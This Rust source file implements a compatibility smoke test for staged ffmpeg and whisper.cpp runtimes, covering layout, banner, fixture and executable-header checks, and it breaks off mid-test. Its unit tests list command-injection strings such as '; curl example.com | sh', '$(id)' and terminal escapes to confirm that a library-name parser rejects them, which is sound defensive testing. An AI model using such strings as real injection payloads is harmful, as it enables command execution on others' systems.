//! The managed-install compatibility smoke (P13, ADR 0023 §3 steps 1-2).
//!
//! It runs a staged, unactivated runtime's executables before anything is
//! published or selected. Every executable runs by its explicit absolute path
//! inside the private stage, through the [`ProcessSupervisor`], never through a
//! shell, with its working directory in a private smoke directory created
//! inside the same stage. The digest-bound [`ReviewedCompatibilityPolicy`]
//! sets the stream bound, the generated-file bounds, the deadlines and the
//! audio format.
//!
//! The checks, in order, each stopping the smoke at its first failure:
//!
//! 1. **Layout.** Every candidate's runtime still holds exactly its reviewed
//!    files, bytes and modes. Each executable the smoke will run is reviewed
//!    as executable and is in the host's native executable format; the model
//!    file is present.
//! 2. **Banner.** `ffmpeg -version` and `ffprobe -version` must print the
//!    policy's reviewed build prefix on their first line; `whisper-cli --help`
//!    must exit successfully (whisper.cpp prints no version banner, and its
//!    executable's SHA-256 is already bound by the review). Each run is bounded
//!    by the policy's stream limit and media deadline.
//! 3. **Media fixture.** The existing [`FixtureMediaToolVerifier`] runs the
//!    reviewed F01 checks through the staged `FFmpeg` and `FFprobe`, within the
//!    media deadline; it already bounds the generated audio by the policy.
//! 4. **Speech fixture.** The existing [`FixtureAsrVerifier`] transcribes the
//!    reviewed speech fixture through whisper.cpp and the model, within the
//!    inference deadline and with the transcript file bounded by the policy.
//! 5. **Recheck.** The smoke directory must be empty (it is then removed) and
//!    every runtime must still match its review, so a provider that wrote into
//!    its own installation fails.
//!
//! A component that needs another uses the staged one when it is among the
//! candidates, and otherwise an already selected provider from
//! [`SmokeCompanions`]; companions are not smoked again here, because they
//! passed their own verification when they were selected.
//!
//! The smoke never publishes, selects or removes anything: cleanup of a failed
//! candidate belongs to [`vsift_application::smoke_before_activation`].

use std::{
    io::{self, Read},
    num::{NonZeroU16, NonZeroUsize},
    path::{Path, PathBuf},
    time::Duration,
};

use CompatibilitySmokeCheck as Check;
use CompatibilitySmokeFailureReason as Reason;
use vsift_application::{
    AsrFailureReason, CompatibilitySmoke, CompatibilitySmokeCheck, CompatibilitySmokeFailure,
    CompatibilitySmokeFailureReason, CompatibilitySmokeVerdict, LocalAsrVerification,
    LocalAsrVerificationFailure, LocalAsrVerifier, MediaToolFailure, MediaToolVerification,
    MediaToolVerifier, RecognizerIdentity, ReviewedCompatibilityPolicy, SpeechRecognitionError,
};
use vsift_domain::{ManagedComponent, SharedLibraryName};

use crate::{
    ExecutableResolutionError, FixtureAsrVerifier, FixtureMediaToolVerifier, HostIsolation,
    ManagedRuntimeRole, MediaProviderConformance, ProcessCancellation, ProcessError,
    ProcessRequest, ProcessSupervisor, ProcessWorkingDirectory, StagedManagedCandidate,
    SupervisorPolicy, TerminationReason, TrustedExecutable, WhisperCli, WhisperOutputLimits,
    managed_artifact_store::RuntimeFault, run_within_budget,
};

/// Bytes read from an executable to identify its format and machine.
const EXECUTABLE_HEADER_BYTES: u64 = 4096;
/// Recognizer threads for the speech fixture; the fixture is a few seconds of
/// speech, so more threads only add contention on a small host.
const MAX_SMOKE_THREADS: usize = 4;
/// Most architectures a universal Mach-O header may list before it is treated
/// as something else (a Java class file shares its magic number).
const MAX_FAT_ARCHITECTURES: u32 = 16;

/// Providers already selected on this machine that a smoke may use when the
/// candidates do not include them: media tools to decode the speech fixture,
/// a recognizer to exercise a staged model, or a model for a staged recognizer.
#[derive(Clone, Debug, Default)]
pub struct SmokeCompanions {
    /// Selected `FFmpeg` and `FFprobe`, when the media tools are not staged.
    pub media: Option<MediaProviderConformance>,
    /// Selected whisper.cpp executable, when it is not staged.
    pub whisper: Option<TrustedExecutable>,
    /// Selected model file, when it is not staged.
    pub model: Option<PathBuf>,
}

/// Everything the media fixture check needs.
#[derive(Clone, Debug)]
pub struct MediaSmokeRequest {
    /// The media tools under test, by explicit path.
    pub tools: MediaProviderConformance,
    /// The private smoke directory; the verifier makes its own workspace in it.
    pub workspace_parent: PathBuf,
    /// The digest-bound compatibility policy.
    pub policy: ReviewedCompatibilityPolicy,
    /// Host isolation for every provider run.
    pub host_isolation: HostIsolation,
    /// Cancelled when the check's budget ends.
    pub cancellation: ProcessCancellation,
}

/// Everything the speech fixture check needs.
#[derive(Clone, Debug)]
pub struct SpeechSmokeRequest {
    /// Media tools that decode the fixture's speech.
    pub tools: MediaProviderConformance,
    /// The private smoke directory; the verifier makes its own workspace in it.
    pub workspace_parent: PathBuf,
    /// The recognizer and model under test, bounded by the policy.
    pub whisper: WhisperCli,
    /// The recognizer identity read from the files before the run.
    pub expected: RecognizerIdentity,
    /// Host isolation for every provider run.
    pub host_isolation: HostIsolation,
    /// Cancelled when the check's budget ends.
    pub cancellation: ProcessCancellation,
}

/// Builds the fixture verifiers the smoke runs.
///
/// Production uses [`ReviewedFixtureVerifiers`], the same verifiers `setup
/// check` and every media or recognition preflight use. Tests substitute
/// verifiers with fixed verdicts to exercise the smoke's own steps around them.
pub trait SmokeFixtureVerifiers: Send + Sync {
    /// Media fixture verifier.
    type Media: MediaToolVerifier;
    /// Speech fixture verifier.
    type Speech: LocalAsrVerifier;

    /// A verifier for the media fixture check.
    fn media(&self, request: MediaSmokeRequest) -> Self::Media;

    /// A verifier for the speech fixture check.
    fn speech(&self, request: SpeechSmokeRequest) -> Self::Speech;
}

/// The reviewed fixture verifiers: [`FixtureMediaToolVerifier`] and
/// [`FixtureAsrVerifier`].
#[derive(Clone, Copy, Debug, Default)]
pub struct ReviewedFixtureVerifiers;

impl SmokeFixtureVerifiers for ReviewedFixtureVerifiers {
    type Media = FixtureMediaToolVerifier;
    type Speech = FixtureAsrVerifier;

    fn media(&self, request: MediaSmokeRequest) -> Self::Media {
        FixtureMediaToolVerifier::new(
            request.tools,
            request.host_isolation,
            request.workspace_parent,
            request.policy,
            request.cancellation,
        )
    }

    fn speech(&self, request: SpeechSmokeRequest) -> Self::Speech {
        FixtureAsrVerifier::new(
            request.tools,
            request.host_isolation,
            request.workspace_parent,
            request.whisper,
            request.expected,
            request.cancellation,
        )
    }
}

/// The production compatibility smoke over [`StagedManagedCandidate`]s.
pub struct StagedCompatibilitySmoke<V> {
    policy: ReviewedCompatibilityPolicy,
    host_isolation: HostIsolation,
    companions: SmokeCompanions,
    verifiers: V,
    cancellation: ProcessCancellation,
}

impl<V> StagedCompatibilitySmoke<V> {
    /// Creates a smoke bound to the accepted plan's compatibility `policy`.
    ///
    /// Cancelling `cancellation` stops the running provider and fails the
    /// smoke as cancelled.
    #[must_use]
    pub const fn new(
        policy: ReviewedCompatibilityPolicy,
        host_isolation: HostIsolation,
        companions: SmokeCompanions,
        verifiers: V,
        cancellation: ProcessCancellation,
    ) -> Self {
        Self {
            policy,
            host_isolation,
            companions,
            verifiers,
            cancellation,
        }
    }
}

impl<V: SmokeFixtureVerifiers> CompatibilitySmoke<StagedManagedCandidate>
    for StagedCompatibilitySmoke<V>
{
    async fn smoke(&self, candidates: &[StagedManagedCandidate]) -> CompatibilitySmokeVerdict {
        match self.run(candidates).await {
            Ok(()) => CompatibilitySmokeVerdict::Passed,
            Err(failure) => CompatibilitySmokeVerdict::Failed(failure),
        }
    }
}

/// One executable the banner step runs, and what it must print.
struct BannerProbe {
    executable: TrustedExecutable,
    arguments: &'static [&'static str],
    expected_prefix: Option<String>,
}

/// What the resolved candidates and companions ask the smoke to run.
struct SmokePlan {
    banners: Vec<BannerProbe>,
    media: Option<MediaProviderConformance>,
    media_fixture: bool,
    speech: Option<(TrustedExecutable, PathBuf)>,
}

const fn failure(check: Check, reason: Reason) -> CompatibilitySmokeFailure {
    CompatibilitySmokeFailure { check, reason }
}

impl<V: SmokeFixtureVerifiers> StagedCompatibilitySmoke<V> {
    async fn run(
        &self,
        candidates: &[StagedManagedCandidate],
    ) -> Result<(), CompatibilitySmokeFailure> {
        let Some(first) = candidates.first() else {
            return Err(failure(Check::Layout, Reason::InvalidRequest));
        };
        if candidates.iter().enumerate().any(|(index, candidate)| {
            candidates[index + 1..]
                .iter()
                .any(|other| other.component() == candidate.component())
        }) {
            return Err(failure(Check::Layout, Reason::InvalidRequest));
        }
        if self.cancellation.is_cancelled() {
            return Err(failure(Check::Layout, Reason::Cancelled));
        }
        for candidate in candidates {
            candidate
                .inspect_runtime()
                .map_err(|fault| failure(Check::Layout, fault_reason(fault)))?;
        }
        let plan = self.resolve(candidates)?;
        let (smoke_directory, smoke_path) = first
            .create_smoke_directory()
            .map_err(|_| failure(Check::Layout, Reason::Preparation))?;
        let checks = self.run_checks(&plan, &smoke_path).await;
        let removal = first.remove_smoke_directory(smoke_directory);
        checks?;
        removal.map_err(|_| failure(Check::Recheck, Reason::UnexpectedExtraFile))?;
        for candidate in candidates {
            candidate
                .inspect_runtime()
                .map_err(|fault| failure(Check::Recheck, fault_reason(fault)))?;
        }
        Ok(())
    }

    fn resolve(
        &self,
        candidates: &[StagedManagedCandidate],
    ) -> Result<SmokePlan, CompatibilitySmokeFailure> {
        let staged = |component| {
            candidates
                .iter()
                .find(|candidate| candidate.component() == component)
        };
        let media_candidate = staged(ManagedComponent::MediaTools);
        let whisper_candidate = staged(ManagedComponent::WhisperCli);
        let model_candidate = staged(ManagedComponent::WhisperModel);
        let speech_needed = whisper_candidate.is_some() || model_candidate.is_some();
        let mut banners = Vec::new();

        let media = if let Some(candidate) = media_candidate {
            let ffmpeg = staged_executable(candidate, ManagedRuntimeRole::Ffmpeg)?;
            let ffprobe = staged_executable(candidate, ManagedRuntimeRole::Ffprobe)?;
            banners.push(BannerProbe {
                executable: ffmpeg.clone(),
                arguments: &["-version"],
                expected_prefix: Some(self.policy.expected_ffmpeg_version.clone()),
            });
            banners.push(BannerProbe {
                executable: ffprobe.clone(),
                arguments: &["-version"],
                expected_prefix: Some(self.policy.expected_ffprobe_version.clone()),
            });
            Some(MediaProviderConformance::r0(ffmpeg, ffprobe))
        } else if speech_needed {
            Some(
                self.companions
                    .media
                    .clone()
                    .ok_or(failure(Check::Layout, Reason::MissingExecutable))?,
            )
        } else {
            None
        };

        let speech = if speech_needed {
            let whisper = if let Some(candidate) = whisper_candidate {
                let whisper = staged_executable(candidate, ManagedRuntimeRole::WhisperCli)?;
                banners.push(BannerProbe {
                    executable: whisper.clone(),
                    arguments: &["--help"],
                    expected_prefix: None,
                });
                whisper
            } else {
                self.companions
                    .whisper
                    .clone()
                    .ok_or(failure(Check::Layout, Reason::MissingExecutable))?
            };
            let model = if let Some(candidate) = model_candidate {
                staged_model(candidate)?
            } else {
                self.companions
                    .model
                    .clone()
                    .ok_or(failure(Check::Layout, Reason::MissingExecutable))?
            };
            Some((whisper, model))
        } else {
            None
        };

        Ok(SmokePlan {
            banners,
            media,
            media_fixture: media_candidate.is_some(),
            speech,
        })
    }

    async fn run_checks(
        &self,
        plan: &SmokePlan,
        smoke_path: &Path,
    ) -> Result<(), CompatibilitySmokeFailure> {
        let working = ProcessWorkingDirectory::new(smoke_path)
            .map_err(|_| failure(Check::Banner, Reason::Preparation))?;
        for probe in &plan.banners {
            self.banner(probe, &working)
                .await
                .map_err(|reason| failure(Check::Banner, reason))?;
        }
        if plan.media_fixture
            && let Some(tools) = &plan.media
        {
            self.media_fixture(tools, smoke_path)
                .await
                .map_err(|reason| failure(Check::MediaFixture, reason))?;
        }
        if let (Some((whisper, model)), Some(tools)) = (&plan.speech, &plan.media) {
            self.speech_fixture(tools, whisper, model, smoke_path)
                .await
                .map_err(|reason| failure(Check::SpeechFixture, reason))?;
        }
        Ok(())
    }

    async fn banner(
        &self,
        probe: &BannerProbe,
        working: &ProcessWorkingDirectory,
    ) -> Result<(), Reason> {
        let limit = NonZeroUsize::new(self.policy.stream_limit_bytes).ok_or(Reason::Preparation)?;
        let supervisor = ProcessSupervisor::new(
            SupervisorPolicy::default().with_stream_limits(limit, limit),
            self.host_isolation,
        );
        let request = ProcessRequest::new(
            probe.executable.clone(),
            working.clone(),
            Duration::from_secs(self.policy.media_deadline_seconds),
        )
        .map_err(|_| Reason::Preparation)?
        .with_arguments(probe.arguments.iter().copied());
        let outcome = supervisor
            .run(request, self.cancellation.child())
            .await
            .map_err(|error| spawn_reason(&error))?;
        match outcome.termination {
            TerminationReason::Exited if outcome.status.success() => {}
            // A program the loader could not start says so in its own error
            // output; only the library's validated file name is taken from it.
            TerminationReason::Exited => {
                return Err(missing_shared_library(&outcome.stderr.bytes)
                    .map_or(Reason::ProviderFailed, Reason::MissingSharedLibrary));
            }
            TerminationReason::Deadline => return Err(Reason::DeadlineExceeded),
            TerminationReason::OutputLimit(_) => return Err(Reason::OutputOverBound),
            TerminationReason::Cancelled => return Err(Reason::Cancelled),
        }
        if let Some(expected) = &probe.expected_prefix
            && !first_line(&outcome.stdout.bytes).starts_with(expected.as_str())
        {
            return Err(Reason::BannerMismatch);
        }
        Ok(())
    }

    async fn media_fixture(
        &self,
        tools: &MediaProviderConformance,
        smoke_path: &Path,
    ) -> Result<(), Reason> {
        let cancellation = self.cancellation.child();
        let verifier = self.verifiers.media(MediaSmokeRequest {
            tools: tools.clone(),
            workspace_parent: smoke_path.to_path_buf(),
            policy: self.policy.clone(),
            host_isolation: self.host_isolation,
            cancellation: cancellation.clone(),
        });
        // The policy's media deadline bounds the whole fixture check, which is
        // stricter than bounding each of its provider runs.
        let budget = Duration::from_secs(self.policy.media_deadline_seconds);
        match run_within_budget(budget, &cancellation, verifier.verify()).await {
            None => Err(Reason::DeadlineExceeded),
            Some(MediaToolVerification::Verified) => Ok(()),
            Some(MediaToolVerification::Failed { failure, .. }) => Err(media_reason(failure)),
        }
    }

    async fn speech_fixture(
        &self,
        tools: &MediaProviderConformance,
        whisper: &TrustedExecutable,
        model: &Path,
        smoke_path: &Path,
    ) -> Result<(), Reason> {
        let cli = WhisperCli::new(whisper.clone(), model, smoke_threads(), self.host_isolation)
            .map_err(|_| Reason::MissingExecutable)?
            .with_output_limits(WhisperOutputLimits {
                max_bytes: self.policy.transcript_file_limit_bytes,
                ..WhisperOutputLimits::R0
            });
        let expected = cli
            .recognizer_identity()
            .await
            .map_err(|error| match error {
                SpeechRecognitionError::ModelUnavailable => Reason::ChangedContent,
                _ => Reason::ProviderFailed,
            })?;
        let cancellation = self.cancellation.child();
        let verifier = self.verifiers.speech(SpeechSmokeRequest {
            tools: tools.clone(),
            workspace_parent: smoke_path.to_path_buf(),
            whisper: cli,
            expected,
            host_isolation: self.host_isolation,
            cancellation: cancellation.clone(),
        });
        let budget = Duration::from_secs(self.policy.inference_deadline_seconds);
        match run_within_budget(budget, &cancellation, verifier.verify()).await {
            None => Err(Reason::DeadlineExceeded),
            Some(LocalAsrVerification::Verified) => Ok(()),
            Some(LocalAsrVerification::Failed(failure)) => Err(speech_reason(failure)),
        }
    }
}

/// Opens the staged executable playing `role`, checks it may run here, and
/// returns it by its explicit path inside the stage.
fn staged_executable(
    candidate: &StagedManagedCandidate,
    role: ManagedRuntimeRole,
) -> Result<TrustedExecutable, CompatibilitySmokeFailure> {
    let layout = |reason| failure(Check::Layout, reason);
    let name = candidate
        .role_file(role)
        .ok_or(layout(Reason::MissingExecutable))?;
    let mut opened = candidate
        .open_role_file(name)
        .map_err(|fault| layout(fault_reason(fault)))?;
    if !opened.executable {
        return Err(layout(Reason::NotExecutable));
    }
    match read_executable_format(&mut opened.file) {
        Ok(ExecutableFormat::Native) => {}
        Ok(ExecutableFormat::Foreign) => return Err(layout(Reason::WrongArchitecture)),
        Ok(ExecutableFormat::Unrecognised) => return Err(layout(Reason::NotExecutable)),
        Err(_) => return Err(layout(Reason::ChangedContent)),
    }
    TrustedExecutable::managed(&opened.path).map_err(|error| {
        layout(match error {
            ExecutableResolutionError::NotFound => Reason::MissingExecutable,
            _ => Reason::ChangedContent,
        })
    })
}

/// The staged model's explicit path, after a full recheck of its bytes.
fn staged_model(candidate: &StagedManagedCandidate) -> Result<PathBuf, CompatibilitySmokeFailure> {
    let layout = |reason| failure(Check::Layout, reason);
    let name = candidate
        .role_file(ManagedRuntimeRole::SpeechModel)
        .ok_or(layout(Reason::MissingExecutable))?;
    candidate
        .open_role_file(name)
        .map(|opened| opened.path)
        .map_err(|fault| layout(fault_reason(fault)))
}

const fn fault_reason(fault: RuntimeFault) -> Reason {
    match fault {
        RuntimeFault::ExtraEntry => Reason::UnexpectedExtraFile,
        RuntimeFault::Missing => Reason::MissingExecutable,
        RuntimeFault::Ownership | RuntimeFault::Changed => Reason::ChangedContent,
        RuntimeFault::Io => Reason::Preparation,
    }
}

/// Maps a supervisor failure before or around the spawn.
fn spawn_reason(error: &ProcessError) -> Reason {
    match error {
        ProcessError::Spawn(error) => match error.kind() {
            io::ErrorKind::NotFound => Reason::MissingExecutable,
            io::ErrorKind::PermissionDenied => Reason::NotExecutable,
            _ if is_executable_format_error(error) => Reason::WrongArchitecture,
            _ => Reason::ProviderFailed,
        },
        ProcessError::CancelledBeforeSpawn => Reason::Cancelled,
        ProcessError::IsolationUnavailable | ProcessError::DeadlineOutOfRange => {
            Reason::Preparation
        }
        ProcessError::PipeUnavailable(_)
        | ProcessError::StreamRead(..)
        | ProcessError::OutputTaskFailed
        | ProcessError::Wait(_)
        | ProcessError::Terminate(_)
        | ProcessError::ReapDeadlineExceeded => Reason::ProviderFailed,
    }
}

/// Whether the operating system refused an executable's format (`ENOEXEC`
/// on Unix, `ERROR_BAD_EXE_FORMAT` on Windows). The layout step's header
/// check normally reports this first; this covers what it cannot see.
#[cfg(unix)]
fn is_executable_format_error(error: &io::Error) -> bool {
    error.raw_os_error() == Some(rustix::io::Errno::NOEXEC.raw_os_error())
}

/// See the Unix variant.
#[cfg(windows)]
fn is_executable_format_error(error: &io::Error) -> bool {
    const ERROR_BAD_EXE_FORMAT: i32 = 193;
    error.raw_os_error() == Some(ERROR_BAD_EXE_FORMAT)
}

/// See the Unix variant.
#[cfg(not(any(unix, windows)))]
fn is_executable_format_error(_error: &io::Error) -> bool {
    false
}

/// The words the GNU dynamic loader prints, on the program's own standard
/// error, when a shared library the program needs is not installed:
/// `<program>: error while loading shared libraries: <name>: cannot open
/// shared object file: No such file or directory`.
const LOADER_MARKER: &str = "error while loading shared libraries: ";
const LOADER_CANNOT_OPEN: &str = ": cannot open shared object file";

/// The shared library a program's error output says the loader could not
/// find (#256), or `None`.
///
/// The output is untrusted text: the program is the user's tool or a reviewed
/// archive's, and either may print anything. Only the first line holding the
/// loader's marker is read, only the text between the marker and the fixed
/// ending is considered, and only a name that [`SharedLibraryName::parse`]
/// accepts (a plain library file name: no path, space or punctuation a shell
/// or terminal acts on) is returned. Nothing else of the output is kept.
fn missing_shared_library(standard_error: &[u8]) -> Option<SharedLibraryName> {
    let text = String::from_utf8_lossy(standard_error);
    let after_marker = text
        .lines()
        .find_map(|line| line.split_once(LOADER_MARKER).map(|(_, after)| after))?;
    let (name, _) = after_marker.split_once(LOADER_CANNOT_OPEN)?;
    SharedLibraryName::parse(name)
}

const fn media_reason(failure: MediaToolFailure) -> Reason {
    match failure {
        MediaToolFailure::FixtureIntegrity | MediaToolFailure::Workspace => Reason::Preparation,
        MediaToolFailure::ProcessFailure | MediaToolFailure::ProviderRejected => {
            Reason::ProviderFailed
        }
        MediaToolFailure::Deadline => Reason::DeadlineExceeded,
        MediaToolFailure::OutputLimit => Reason::OutputOverBound,
        MediaToolFailure::UnexpectedResult => Reason::FixtureMismatch,
        MediaToolFailure::Cancelled => Reason::Cancelled,
    }
}

const fn speech_reason(failure: LocalAsrVerificationFailure) -> Reason {
    match failure {
        LocalAsrVerificationFailure::FixtureIntegrity | LocalAsrVerificationFailure::Workspace => {
            Reason::Preparation
        }
        LocalAsrVerificationFailure::FixtureMedia => Reason::ProviderFailed,
        LocalAsrVerificationFailure::UnexpectedTranscript => Reason::FixtureMismatch,
        LocalAsrVerificationFailure::Transcription(failure) => match failure.reason {
            AsrFailureReason::Cancelled => Reason::Cancelled,
            AsrFailureReason::Deadline => Reason::DeadlineExceeded,
            AsrFailureReason::ResourceLimit => Reason::OutputOverBound,
            AsrFailureReason::ModelChanged
            | AsrFailureReason::ModelUnavailable
            | AsrFailureReason::UnpinnedModel => Reason::ChangedContent,
            AsrFailureReason::AudioUnavailable
            | AsrFailureReason::ProviderFailed
            | AsrFailureReason::AbnormalTermination
            | AsrFailureReason::Io => Reason::ProviderFailed,
            AsrFailureReason::UnparseableOutput | AsrFailureReason::MalformedOutput(_) => {
                Reason::FixtureMismatch
            }
            AsrFailureReason::InvalidRange
            | AsrFailureReason::TooManyChunks
            | AsrFailureReason::Busy
            | AsrFailureReason::Workspace
            | AsrFailureReason::InvalidRun(_) => Reason::Preparation,
        },
    }
}

/// The first line of a provider's standard output, lossily decoded, without
/// its line ending. Only compared, never echoed.
fn first_line(bytes: &[u8]) -> String {
    let line = bytes.split(|byte| *byte == b'\n').next().unwrap_or(&[]);
    String::from_utf8_lossy(line).trim_end().to_owned()
}

fn smoke_threads() -> NonZeroU16 {
    let threads = std::thread::available_parallelism()
        .map_or(1, NonZeroUsize::get)
        .min(MAX_SMOKE_THREADS);
    u16::try_from(threads)
        .ok()
        .and_then(NonZeroU16::new)
        .unwrap_or(NonZeroU16::MIN)
}

/// Whether an executable can run on this host, from its header alone.
#[derive(Clone, Copy, Debug, Eq, PartialEq)]
enum ExecutableFormat {
    /// The host's own executable container and machine.
    Native,
    /// A recognised executable for another machine or operating system.
    Foreign,
    /// Not a recognised executable container (a script, data or truncation).
    Unrecognised,
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
enum Container {
    Elf,
    Pe,
    MachO,
}

/// The container and machine code this build runs natively.
const fn native_machine() -> Option<(Container, u32)> {
    if cfg!(all(target_os = "linux", target_arch = "x86_64")) {
        Some((Container::Elf, 0x3e))
    } else if cfg!(all(target_os = "linux", target_arch = "aarch64")) {
        Some((Container::Elf, 0xb7))
    } else if cfg!(all(target_os = "windows", target_arch = "x86_64")) {
        Some((Container::Pe, 0x8664))
    } else if cfg!(all(target_os = "windows", target_arch = "aarch64")) {
        Some((Container::Pe, 0xaa64))
    } else if cfg!(all(target_os = "macos", target_arch = "aarch64")) {
        Some((Container::MachO, 0x0100_000c))
    } else if cfg!(all(target_os = "macos", target_arch = "x86_64")) {
        Some((Container::MachO, 0x0100_0007))
    } else {
        None
    }
}

fn read_executable_format(file: &mut std::fs::File) -> io::Result<ExecutableFormat> {
    let mut header = Vec::new();
    file.take(EXECUTABLE_HEADER_BYTES)
        .read_to_end(&mut header)?;
    Ok(classify_executable_header(&header, native_machine()))
}

fn classify_executable_header(header: &[u8], native: Option<(Container, u32)>) -> ExecutableFormat {
    let machines = executable_machines(header);
    if machines.is_empty() {
        return ExecutableFormat::Unrecognised;
    }
    if native.is_some_and(|native| machines.contains(&native)) {
        ExecutableFormat::Native
    } else {
        ExecutableFormat::Foreign
    }
}

/// Every container and machine an executable header declares: one for a
/// plain executable, several for a universal Mach-O, none when unrecognised.
fn executable_machines(header: &[u8]) -> Vec<(Container, u32)> {
    let short_little = |offset: usize| {
        header
            .get(offset..offset + 2)
            .map(|bytes| u32::from(u16::from_le_bytes([bytes[0], bytes[1]])))
    };
    let short_big = |offset: usize| {
        header
            .get(offset..offset + 2)
            .map(|bytes| u32::from(u16::from_be_bytes([bytes[0], bytes[1]])))
    };
    let long_little = |offset: usize| {
        header
            .get(offset..offset + 4)
            .map(|bytes| u32::from_le_bytes([bytes[0], bytes[1], bytes[2], bytes[3]]))
    };
    let long_big = |offset: usize| {
        header
            .get(offset..offset + 4)
            .map(|bytes| u32::from_be_bytes([bytes[0], bytes[1], bytes[2], bytes[3]]))
    };
    match header.get(..4) {
        Some([0x7f, b'E', b'L', b'F']) => {
            let machine = match header.get(5) {
                Some(1) => short_little(18),
                Some(2) => short_big(18),
                _ => None,
            };
            machine
                .map(|machine| vec![(Container::Elf, machine)])
                .unwrap_or_default()
        }
        Some([b'M', b'Z', ..]) => long_little(0x3c)
            .and_then(|offset| usize::try_from(offset).ok())
            .filter(|offset| header.get(*offset..offset + 4) == Some(b"PE\0\0".as_slice()))
            .and_then(|offset| short_little(offset + 4))
            .map(|machine| vec![(Container::Pe, machine)])
            .unwrap_or_default(),
        Some([0xcf | 0xce, 0xfa, 0xed, 0xfe]) => long_little(4)
            .map(|machine| vec![(Container::MachO, machine)])
            .unwrap_or_default(),
        Some([0xfe, 0xed, 0xfa, 0xcf | 0xce]) => long_big(4)
            .map(|machine| vec![(Container::MachO, machine)])
            .unwrap_or_default(),
        Some([0xca, 0xfe, 0xba, 0xbe]) => {
            let count = long_big(4).filter(|count| (1..=MAX_FAT_ARCHITECTURES).contains(count));
            count
                .map(|count| {
                    (0..count)
                        .filter_map(|index| {
                            usize::try_from(index)
                                .ok()
                                .and_then(|index| long_big(8 + index * 20))
                        })
                        .map(|machine| (Container::MachO, machine))
                        .collect()
                })
                .unwrap_or_default()
        }
        _ => Vec::new(),
    }
}

#[cfg(test)]
mod tests {
    use vsift_application::{
        AsrFailure, AsrStage, CompatibilitySmokeFailureReason as Reason,
        LocalAsrVerificationFailure, MediaToolFailure,
    };

    use super::{
        Container, ExecutableFormat, classify_executable_header, first_line, media_reason,
        missing_shared_library, speech_reason,
    };

    fn named(standard_error: &str) -> Option<String> {
        missing_shared_library(standard_error.as_bytes()).map(|name| name.as_str().to_owned())
    }

    /// The loader's own words give the library; anything else is nothing.
    #[test]
    fn only_the_loaders_fixed_words_name_a_missing_library() {
        let loader = "whisper-cli: error while loading shared libraries: libgomp.so.1: cannot open shared object file: No such file or directory\n";
        assert_eq!(named(loader), Some("libgomp.so.1".to_owned()));
        // Output before and after, a prefix path, other libraries after the first.
        assert_eq!(
            named(&format!(
                "warming up\n/opt/tool/bin/whisper-cli: error while loading shared libraries: libstdc++.so.6: cannot open shared object file: No such file or directory\n{loader}"
            )),
            Some("libstdc++.so.6".to_owned())
        );
        // Not the loader's words: other failures, a truncated line, an empty name.
        for other in [
            "",
            "whisper-cli: fixture failure\n",
            "error while loading shared libraries: \n",
            "error while loading shared libraries: libgomp.so.1\n",
            "error while loading shared libraries: libgomp.so.1: no such thing\n",
            "error while loading shared libraries: : cannot open shared object file\n",
            "libgomp.so.1: cannot open shared object file: No such file or directory\n",
            "whisper-cli: error while loading shared object: libgomp.so.1: cannot open shared object file\n",
        ] {
            assert_eq!(named(other), None, "{other:?}");
        }
    }

    /// The output is untrusted: a name that is a path, carries shell or
    /// terminal syntax or is too long is dropped, never shown.
    #[test]
    fn a_hostile_name_in_the_loaders_words_is_dropped() {
        for name in [
            "/usr/lib/libgomp.so.1",
            "../libgomp.so.1",
            "libgomp.so.1; curl example.com | sh",
            "libgomp.so.1 && id",
            "libgomp$(id).so.1",
            "`id`",
            "libgomp.so.1\u{1b}[2J",
            "libgomp\u{202e}.so.1",
            "libg\u{f6}mp.so.1",
            "LD_PRELOAD=libgomp.so.1",
        ] {
            let output = format!(
                "x: error while loading shared libraries: {name}: cannot open shared object file: No such file or directory\n"
            );
            assert_eq!(named(&output), None, "{name:?}");
        }
        let long = "a".repeat(5_000);
        assert_eq!(
            named(&format!(
                "x: error while loading shared libraries: lib{long}.so.1: cannot open shared object file\n"
            )),
            None
        );
        // Bytes that are not UTF-8 never panic and never name a library.
        assert_eq!(
            missing_shared_library(
                b"x: error while loading shared libraries: libgomp\xff.so.1: cannot open shared object file\n"
            ),
            None
        );
    }

    fn elf(machine: u16) -> Vec<u8> {
        let mut header = vec![0_u8; 64];
        header[..4].copy_from_slice(b"\x7fELF");
        header[4] = 2;
        header[5] = 1;
        header[18..20].copy_from_slice(&machine.to_le_bytes());
        header
    }

    fn pe(machine: u16) -> Vec<u8> {
        let mut header = vec![0_u8; 0x100];
        header[..2].copy_from_slice(b"MZ");
        header[0x3c..0x40].copy_from_slice(&0x80_u32.to_le_bytes());
        header[0x80..0x84].copy_from_slice(b"PE\0\0");
        header[0x84..0x86].copy_from_slice(&machine.to_le_bytes());
        header
    }

    fn macho(cpu: u32) -> Vec<u8> {
        let mut header = vec![0_u8; 32];
        header[..4].copy_from_slice(&[0xcf, 0xfa, 0xed, 0xfe]);
        header[4..8].copy_from_slice(&cpu.to_le_bytes());
        header
    }

    #[test]
    fn headers_are_native_foreign_or_unrecognised() {
        let linux = Some((Container::Elf, 0x3e));
        assert_eq!(
            classify_executable_header(&elf(0x3e), linux),
            ExecutableFormat::Native
        );
        assert_eq!(
            classify_executable_header(&elf(0xb7), linux),
            ExecutableFormat::Foreign
        );
        assert_eq!(
            classify_executable_header(&pe(0x8664), linux),
            ExecutableFormat::Foreign
        );
        let windows = Some((Container::Pe, 0x8664));
        assert_eq!(
            classify_executable_header(&pe(0x8664), windows),
            ExecutableFormat::Native
        );
        assert_eq!(
            classify_executable_header(&elf(0x3e), windows),
            ExecutableFormat::Foreign
        );
        let mac = Some((Container::MachO, 0x0100_000c));
        assert_eq!(
            classify_executable_header(&macho(0x0100_000c), mac),
            ExecutableFormat::Native
        );
        assert_eq!(
            classify_executable_header(&macho(0x0100_0007), mac),
            ExecutableFormat::Foreign
        );
        let mut fat = vec![0_u8; 64];
        fat[..4].copy_from_slice(&[0xca, 0xfe, 0xba, 0xbe]);
        fat[4..8].copy_from_slice(&2_u32.to_be_bytes());
        fat[8..12].copy_from_slice(&0x0100_0007_u32.to_be_bytes());
        fat[28..32].copy_from_slice(&0x0100_000c_u32.to_be_bytes());
        assert_eq!(
            classify_executable_header(&fat, mac),
            ExecutableFormat::Native
        );
        for unrecognised in [
            b"#!/bin/sh\necho ffmpeg version\n".as_slice(),
            b"",
            b"\x7fEL",
            b"MZ without a PE header",
        ] {
            assert_eq!(
                classify_executable_header(unrecognised, linux),
                ExecutableFormat::Unrecognised
            );
        }
        assert_eq!(
            classify_executable_header(&elf(0x3e), None),
            ExecutableFormat::Foreign
        );
    }

    #[test]
    fn only_the_first_stdout_line_is_compared() {
        assert_eq!(
